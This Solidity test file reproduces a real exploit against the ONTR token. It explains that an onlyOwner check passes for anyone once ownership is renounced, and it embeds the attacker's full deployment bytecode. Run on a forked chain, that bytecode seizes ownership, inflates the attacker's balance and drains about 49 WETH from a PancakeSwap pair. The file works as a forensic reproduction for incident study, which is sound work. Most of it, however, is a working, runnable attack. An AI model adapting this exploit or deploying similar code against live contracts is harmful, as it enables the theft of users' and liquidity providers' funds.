// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~49.4801 WETH (~$98k)
// Attacker : 0xE806B37A9F965bd9D54AaDf9560C78957550b760
// Attack Contract : 0xD7A33e89aBC1Ac5b2497D9589c81784A2BC52491 (CREATE in attack tx, nonce 0)
// Vulnerable Contract : 0xf074865358b0dd039beee075831f8a2ae6b1f3f3 (ONTR / OpenTrade Token)
// Victim Pair : 0xd46d89f4675bc96328fbdeb443842cdb5fcd83fd (PancakeSwap WETH/ONTR on Ethereum)
// Attack Tx : https://etherscan.io/tx/0x98f80eff0ce609606bb73cef3edfbb4c1d415ffc7676fec16f4d980c54903621
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf074865358b0dd039beee075831f8a2ae6b1f3f3#code
// WETH : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//
// @Analysis
// Root cause:
//  Custom onlyOwner is `require(owner == address(0) || owner == msg.sender)`, so when
//  ownership has been renounced (owner == 0) ANY caller is treated as owner.
//  Pre-attack owner was address(0). Attacker CREATE seizes ownership, queues a
//  desertJasper balance of 1e30, applies it via glenFlash/ashBud (balance += 1e30
//  without bumping totalSupply), dumps into the Pancake pair, and swaps for WETH.
//
// PoC strategy: replay historical CREATE initcode at block 25193099 (one before exploit).
// Historical CREATE address depends on attacker nonce=0. Entire attack is in constructor.
//
// Chain note: queue initially listed BSC; on-chain addresses (WETH mainnet, Pancake
// factory 0x1097…) are Ethereum mainnet.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IONTR {
    function owner() external view returns (address);
    function transferOwnership(address) external;
    function desertJasper(address starField, uint256 meadowWood) external;
    function glenFlash() external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}


contract ONTR_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0xE806B37A9F965bd9D54AaDf9560C78957550b760;
    // Historical CREATE address (attacker nonce 0 at fork block)
    address constant ATTACK_CONTRACT = 0xD7A33e89aBC1Ac5b2497D9589c81784A2BC52491;
    address constant ONTR = 0xF074865358B0Dd039beeE075831f8A2Ae6B1F3f3;
    address constant PAIR = 0xd46D89f4675bc96328fBDEB443842cdB5Fcd83FD;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 constant ATTACK_BLOCK = 25_193_100;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;
    // Exact historical WETH profit transferred to attacker EOA in the CREATE tx
    uint256 constant EXPECTED_PROFIT = 49_480_100_697_512_152_261;
    uint256 constant INFLATE_AMOUNT = 1e30;

    // Historical CREATE initcode from tx 0x98f80eff0ce609606bb73cef3edfbb4c1d415ffc7676fec16f4d980c54903621
    // Constructor: require(tx.origin==attacker) → transferOwnership(this) →
    // desertJasper(this,1e30) → glenFlash() → transfer(pair,1e30) → swap WETH to EOA.
    bytes constant CREATE_INITCODE =
        hex"608060405234801561000f575f5ffd5b5073e806b37a9f965bd9d54aadf9560c"
        hex"78957550b76073ffffffffffffffffffffffffffffffffffffffff163273ffff"
        hex"ffffffffffffffffffffffffffffffffffff1614610092576040517f08c379a0"
        hex"0000000000000000000000000000000000000000000000000000000081526004"
        hex"016100899061059b565b60405180910390fd5b5f73f074865358b0dd039beee0"
        hex"75831f8a2ae6b1f3f390505f73d46d89f4675bc96328fbdeb443842cdb5fcd83"
        hex"fd90508173ffffffffffffffffffffffffffffffffffffffff1663f2fde38b30"
        hex"6040518263ffffffff1660e01b81526004016100fb91906105f8565b5f604051"
        hex"808303815f87803b158015610112575f5ffd5b505af1158015610124573d5f5f"
        hex"3e3d5ffd5b505050505f6c0c9f2c9cd04674edea4000000090508273ffffffff"
        hex"ffffffffffffffffffffffffffffffff1663a3af12c330836040518363ffffff"
        hex"ff1660e01b8152600401610174929190610629565b5f604051808303815f8780"
        hex"3b15801561018b575f5ffd5b505af115801561019d573d5f5f3e3d5ffd5b5050"
        hex"50508273ffffffffffffffffffffffffffffffffffffffff1663272693f06040"
        hex"518163ffffffff1660e01b81526004015f604051808303815f87803b15801561"
        hex"01e6575f5ffd5b505af11580156101f8573d5f5f3e3d5ffd5b505050508273ff"
        hex"ffffffffffffffffffffffffffffffffffffff1663a9059cbb73d46d89f4675b"
        hex"c96328fbdeb443842cdb5fcd83fd836040518363ffffffff1660e01b81526004"
        hex"0161024b929190610629565b6020604051808303815f875af115801561026757"
        hex"3d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081"
        hex"019061028b9190610689565b505f5f8373ffffffffffffffffffffffffffffff"
        hex"ffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060"
        hex"405180830381865afa1580156102d7573d5f5f3e3d5ffd5b505050506040513d"
        hex"601f19601f820116820180604052508101906102fb9190610730565b50915091"
        hex"505f73f074865358b0dd039beee075831f8a2ae6b1f3f373ffffffffffffffff"
        hex"ffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffff"
        hex"ffffff16630dfe16816040518163ffffffff1660e01b81526004016020604051"
        hex"80830381865afa158015610375573d5f5f3e3d5ffd5b505050506040513d601f"
        hex"19601f8201168201806040525081019061039991906107aa565b73ffffffffff"
        hex"ffffffffffffffffffffffffffffff161490505f816103be57826103c0565b83"
        hex"5b6dffffffffffffffffffffffffffff1690505f826103de57846103e0565b83"
        hex"5b6dffffffffffffffffffffffffffff1690505f6103e5876104019190610802"
        hex"565b90505f816103e8856104139190610802565b61041d9190610843565b8383"
        hex"6104299190610802565b61043391906108a3565b905060646063826104449190"
        hex"610802565b61044e91906108a3565b9050680270801d946c9400008110156104"
        hex"9c576040517f08c379a000000000000000000000000000000000000000000000"
        hex"00000000000081526004016104939061091d565b60405180910390fd5b8873ff"
        hex"ffffffffffffffffffffffffffffffffffffff1663022c0d9f866104c3578261"
        hex"04c5565b5f5b876104d0575f6104d2565b835b73e806b37a9f965bd9d54aadf9"
        hex"560c78957550b7606040518463ffffffff1660e01b8152600401610505939291"
        hex"9061096e565b5f604051808303815f87803b15801561051c575f5ffd5b505af1"
        hex"15801561052e573d5f5f3e3d5ffd5b50505050505050505050505050506109b6"
        hex"565b5f82825260208201905092915050565b7f756e617574686f72697a656400"
        hex"000000000000000000000000000000000000005f82015250565b5f610585600c"
        hex"83610541565b915061059082610551565b602082019050919050565b5f602082"
        hex"0190508181035f8301526105b281610579565b9050919050565b5f73ffffffff"
        hex"ffffffffffffffffffffffffffffffff82169050919050565b5f6105e2826105"
        hex"b9565b9050919050565b6105f2816105d8565b82525050565b5f602082019050"
        hex"61060b5f8301846105e9565b92915050565b5f819050919050565b6106238161"
        hex"0611565b82525050565b5f60408201905061063c5f8301856105e9565b610649"
        hex"602083018461061a565b9392505050565b5f5ffd5b5f8115159050919050565b"
        hex"61066881610654565b8114610672575f5ffd5b50565b5f815190506106838161"
        hex"065f565b92915050565b5f6020828403121561069e5761069d610650565b5b5f"
        hex"6106ab84828501610675565b91505092915050565b5f6dffffffffffffffffff"
        hex"ffffffffff82169050919050565b6106d6816106b4565b81146106e0575f5ffd"
        hex"5b50565b5f815190506106f1816106cd565b92915050565b5f63ffffffff8216"
        hex"9050919050565b61070f816106f7565b8114610719575f5ffd5b50565b5f8151"
        hex"905061072a81610706565b92915050565b5f5f5f606084860312156107475761"
        hex"0746610650565b5b5f610754868287016106e3565b9350506020610765868287"
        hex"016106e3565b92505060406107768682870161071c565b915050925092509256"
        hex"5b610789816105d8565b8114610793575f5ffd5b50565b5f815190506107a481"
        hex"610780565b92915050565b5f602082840312156107bf576107be610650565b5b"
        hex"5f6107cc84828501610796565b91505092915050565b7f4e487b710000000000"
        hex"00000000000000000000000000000000000000000000005f5260116004526024"
        hex"5ffd5b5f61080c82610611565b915061081783610611565b9250828202610825"
        hex"81610611565b9150828204841483151761083c5761083b6107d5565b5b509291"
        hex"5050565b5f61084d82610611565b915061085883610611565b92508282019050"
        hex"808211156108705761086f6107d5565b5b92915050565b7f4e487b7100000000"
        hex"0000000000000000000000000000000000000000000000005f52601260045260"
        hex"245ffd5b5f6108ad82610611565b91506108b883610611565b9250826108c857"
        hex"6108c7610876565b5b828204905092915050565b7f6d696e206f757400000000"
        hex"0000000000000000000000000000000000000000005f82015250565b5f610907"
        hex"600783610541565b9150610912826108d3565b602082019050919050565b5f60"
        hex"20820190508181035f830152610934816108fb565b9050919050565b5f828252"
        hex"60208201905092915050565b50565b5f6109595f8361093b565b915061096482"
        hex"61094b565b5f82019050919050565b5f6080820190506109815f83018661061a"
        hex"565b61098e602083018561061a565b61099b60408301846105e9565b81810360"
        hex"608301526109ac8161094e565b9050949350505050565b603e806109c25f395f"
        hex"f3fe60806040525f5ffdfea26469706673582212200c8e41ab57bc63f691c552"
        hex"05ddfc8f9f961c81783755d0b32c2dc41d806278bc64736f6c63430008220033";

    function setUp() public {
        // Online warm: use mainnet alias; exhaustive_warm rewrites to anvil localhost.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = WETH;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        // Precondition: ownership renounced (onlyOwner opens for anyone)
        require(IONTR(ONTR).owner() == address(0), "owner not zero pre-attack");
        require(IERC20(WETH).balanceOf(ATTACKER) == 0, "attacker already funded");

        uint256 pairWethBefore = IERC20(WETH).balanceOf(PAIR);
        uint256 attackerBefore = IERC20(WETH).balanceOf(ATTACKER);
        uint256 supplyBefore = IONTR(ONTR).totalSupply();

        // Replay historical CREATE (attacker nonce 0 → ATTACK_CONTRACT).
        // Entire drain runs in the constructor.
        vm.startPrank(ATTACKER, ATTACKER);
        address deployed;
        bytes memory initcode = CREATE_INITCODE;
        assembly {
            deployed := create(0, add(initcode, 0x20), mload(initcode))
        }
        require(deployed != address(0), "CREATE failed");
        require(deployed == ATTACK_CONTRACT, "CREATE address mismatch");
        vm.stopPrank();

        uint256 attackerAfter = IERC20(WETH).balanceOf(ATTACKER);
        uint256 profit = attackerAfter - attackerBefore;
        uint256 pairWethAfter = IERC20(WETH).balanceOf(PAIR);

        assertEq(profit, EXPECTED_PROFIT, "attacker WETH profit mismatch");
        assertEq(pairWethBefore - pairWethAfter, EXPECTED_PROFIT, "pair WETH drain mismatch");
        // Balance inflation does NOT bump totalSupply (ashBud only)
        assertEq(IONTR(ONTR).totalSupply(), supplyBefore, "totalSupply should be unchanged");
        assertEq(IONTR(ONTR).owner(), ATTACK_CONTRACT, "ownership not seized");

        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);
        emit log_named_decimal_uint("Pair WETH remaining", pairWethAfter, 18);
        emit log_named_uint("Inflate amount (wei units)", INFLATE_AMOUNT);
    }
}
